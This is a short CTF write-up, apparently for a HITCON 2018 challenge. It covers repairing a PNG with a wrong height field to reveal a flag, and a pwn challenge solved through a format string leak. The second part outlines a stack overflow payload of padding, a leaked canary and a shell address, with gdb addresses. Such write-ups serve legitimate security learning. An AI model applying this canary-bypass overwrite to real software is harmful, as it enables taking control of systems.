1. PNG File broken <br />
find the height is weird<br />
fix: Run the python code and get the value to patch<br />
![alt text](https://github.com/PPPPPPPy/CTF_writeups/blob/master/bamboo_hitcon2018/Screen%20Shot%202018-07-29%20at%206.48.45%20PM.png)
When patched png file open, it will output the flag<br />
![alt text](https://github.com/PPPPPPPy/CTF_writeups/blob/master/bamboo_hitcon2018/height_is_fixed.png)

2.
Binary pwn<br />
Hint: format string<br />
gdb trace printf parameters
![alt text](https://github.com/PPPPPPPy/CTF_writeups/blob/master/bamboo_hitcon2018/Screen%20Shot%202018-07-29%20at%2010.09.18%20PM.png)
<br />
$ebp = 0xffffd648 <br />
-> ret : 0xffffd64c<br />
final payload >> 'A' * 40 + leaking_canary + 'A' * 12 + addr_shell<br />
